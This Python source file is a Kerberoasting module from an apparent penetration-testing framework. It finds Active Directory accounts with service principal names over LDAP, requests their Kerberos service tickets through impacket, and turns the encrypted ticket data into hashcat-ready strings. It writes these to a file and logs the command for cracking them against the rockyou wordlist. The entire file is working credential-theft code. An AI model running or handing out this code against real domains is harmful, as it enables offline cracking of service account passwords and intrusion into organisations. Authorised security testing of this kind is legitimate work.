"""Request TGS tickets for SPN accounts -- hashcat-compatible output."""

from __future__ import annotations

import binascii
from pathlib import Path
from typing import List

from sovereign.models import AttackResult, EngagementContext
from sovereign.logger import log
from sovereign.modules.base import BaseModule
from sovereign.utils.ldap_helpers import ldap_connect, ldap_search
from sovereign.data import LDAP_USERS_WITH_SPN, HC_KERBEROAST

try:
    from impacket.krb5.types import Principal
    from impacket.krb5 import constants as krb5const
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
    from impacket.krb5.asn1 import TGS_REP
    IMPACKET = True
except ImportError:
    IMPACKET = False


class KerberoastModule(BaseModule):
    """Request TGS tickets for SPN accounts -- hashcat-compatible output."""

    name = "kerberoast"

    def run(self, ctx: EngagementContext, **kwargs: object) -> List[AttackResult]:
        output_file: str = str(kwargs.get("output_file", ""))

        if not IMPACKET:
            return [AttackResult("kerberoast", "setup", "FAILED",
                                 notes="Install impacket: pip install impacket")]
        results: List[AttackResult] = []

        # Get SPN accounts from loot or enumerate
        spn_accounts = ctx.loot.get("spn_accounts", [])
        if not spn_accounts:
            if not ctx.ldap_conn and not ldap_connect(ctx):
                return [AttackResult("kerberoast", "ldap", "FAILED")]
            entries = ldap_search(ctx, LDAP_USERS_WITH_SPN,
                                  ["sAMAccountName","servicePrincipalName"])
            spn_accounts = []
            for e in entries:
                sam  = str(getattr(e, "sAMAccountName", ""))
                spns = [str(s) for s in (getattr(e, "servicePrincipalName", []) or [])]
                spn_accounts.append({"sam": sam, "spns": spns})

        if not spn_accounts:
            return [AttackResult("kerberoast", "scan", "INFO",
                                 notes="No Kerberoastable accounts found")]

        log(f"[Kerberoast] Targeting {len(spn_accounts)} accounts...", "INFO")
        hashes: List[str] = []

        for account in spn_accounts:
            sam   = account["sam"]
            spns  = account["spns"]
            if not spns:
                continue
            spn = spns[0]  # Use first SPN

            try:
                # Get TGT first
                username_p = Principal(
                    ctx.username,
                    type=krb5const.PrincipalNameType.NT_PRINCIPAL.value
                )
                lm  = binascii.unhexlify(ctx.lm_hash) if ctx.lm_hash else b""
                nt  = binascii.unhexlify(ctx.nt_hash) if ctx.nt_hash else b""
                tgt, cipher, old_key, session_key = getKerberosTGT(
                    username_p, ctx.password, ctx.domain, lm, nt, b"", ctx.dc_ip
                )

                # Request TGS for SPN
                server_p = Principal(
                    spn,
                    type=krb5const.PrincipalNameType.NT_SRV_INST.value
                )
                tgs, cipher_tgs, _, _ = getKerberosTGS(
                    server_p, ctx.domain, ctx.dc_ip, tgt, cipher, session_key
                )

                # Extract hash
                from pyasn1.codec.native import decoder as nd
                decoded_tgs = nd.decode(tgs, asn1Spec=TGS_REP())[0]
                etype = int(decoded_tgs["ticket"]["enc-part"]["etype"])
                cipher_bytes = decoded_tgs["ticket"]["enc-part"]["cipher"].asOctets()

                if etype == 23:
                    hash_str = (
                        f"$krb5tgs$23$*{sam}${ctx.domain.upper()}${spn}*"
                        f"${binascii.hexlify(cipher_bytes[:16]).decode()}"
                        f"${binascii.hexlify(cipher_bytes[16:]).decode()}"
                    )
                elif etype in (17, 18):
                    etype_name = "17" if etype == 17 else "18"
                    hash_str = (
                        f"$krb5tgs${etype_name}$*{sam}${ctx.domain.upper()}${spn}*"
                        f"${binascii.hexlify(cipher_bytes).decode()}"
                    )
                else:
                    hash_str = f"# {sam}: unsupported etype {etype}"

                hashes.append(hash_str)
                log(f"[Kerberoast] Hash captured: {sam} ({spn})", "CRIT")
                results.append(AttackResult(
                    "kerberoast", "tgs_capture", "SUCCESS",
                    target=sam, severity="CRITICAL",
                    data={"sam": sam, "spn": spn, "etype": etype,
                          "hash": hash_str[:80] + "..."},
                    notes=f"TGS hash for {sam}. Crack with: hashcat -m {HC_KERBEROAST} hash.txt rockyou.txt",
                ))

            except Exception as exc:
                log(f"[Kerberoast] {sam}: {exc}", "WARN")
                results.append(AttackResult("kerberoast", "tgs_request", "FAILED",
                                            target=sam, notes=str(exc)))

        if hashes:
            # Save to file
            out = output_file or "kerberoast_hashes.txt"
            Path(out).write_text("\n".join(hashes) + "\n", encoding="utf-8")
            log(f"[Kerberoast] {len(hashes)} hashes saved → {out}", "OK")
            log(f"[Kerberoast] Crack with: hashcat -m 13100 {out} rockyou.txt --force", "OK")
            ctx.loot["kerberoast_hashes"] = hashes
            results.append(AttackResult(
                "kerberoast", "summary", "SUCCESS",
                severity="CRITICAL",
                data={"count": len(hashes), "file": out},
                notes=f"{len(hashes)} TGS hashes saved to {out}. hashcat -m 13100 {out} rockyou.txt",
            ))
        return results
